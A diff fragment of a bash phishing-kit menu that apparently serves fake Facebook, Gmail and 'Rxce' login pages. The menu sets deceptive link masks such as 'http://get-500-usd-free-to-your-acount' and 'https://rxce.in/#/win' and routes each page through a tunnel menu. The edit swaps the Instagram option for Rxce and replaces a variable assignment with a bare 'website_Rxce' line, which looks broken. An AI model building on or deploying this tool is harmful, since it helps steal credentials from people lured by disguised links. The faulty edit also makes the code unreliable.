@@ -575,7 +575,7 @@ main_menu() {
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		site_facebook
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		site_instagram
+		site_Rxce
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		site_gmail
 	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
@@ -591,7 +591,7 @@ main_menu() {
 		mask='http://get-500-usd-free-to-your-acount'
 		tunnel_menu
 	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
-		website="rxce"
+		website_Rxce
 		mask='https://rxce.in/#/win'
 		tunnel_menu
 	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
